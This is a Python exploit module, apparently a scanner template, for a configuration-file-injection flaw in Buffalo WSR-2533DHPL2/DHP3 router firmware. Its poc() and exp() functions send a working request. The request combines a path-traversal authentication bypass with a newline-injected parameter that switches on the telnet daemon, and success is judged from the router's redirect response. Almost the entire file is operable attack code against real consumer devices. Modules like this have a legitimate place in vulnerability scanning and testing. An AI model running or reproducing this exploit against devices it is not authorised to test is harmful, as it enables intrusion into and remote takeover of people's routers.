import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Buffalo WSR-2533DHPL2 - Configuration File Injection''',
        "description": '''The web interfaces of Buffalo WSR-2533DHPL2 firmware version <= 1.02 and WSR-2533DHP3 firmware version <= 1.24 do not properly sanitize user input. An authenticated remote attacker could leverage this vulnerability to alter device configuration, potentially gaining remote code execution.''',
        "severity": "critical",
        "references": [
            "https://blogs.juniper.net/en-us/security/freshly-disclosed-vulnerability-cve-2021-20090-exploited-in-the-wild", 
            "https://www.tenable.com/security/research/tra-2021-13", 
            "https://medium.com/tenable-techblog/bypassing-authentication-on-arcadyan-routers-with-cve-2021-20090-and-rooting-some-buffalo-ea1dd30980c2"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["buffalo", "firmware", "iot"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/images/..%2fapply_abstract.cgi"""
        method = "POST"
        data = """action=start_ping&submit_button=ping.html&action_params=blink_time%3D5&ARC_ping_ipaddress=127.0.0.1%0A
ARC_SYS_TelnetdEnable=1&ARC_ping_status=0&TMP_Ping_Type=4"""
        headers = {'Connection': 'close'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""/Success.htm""" in str(resp0.headers)) and (resp0.status_code == 302):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url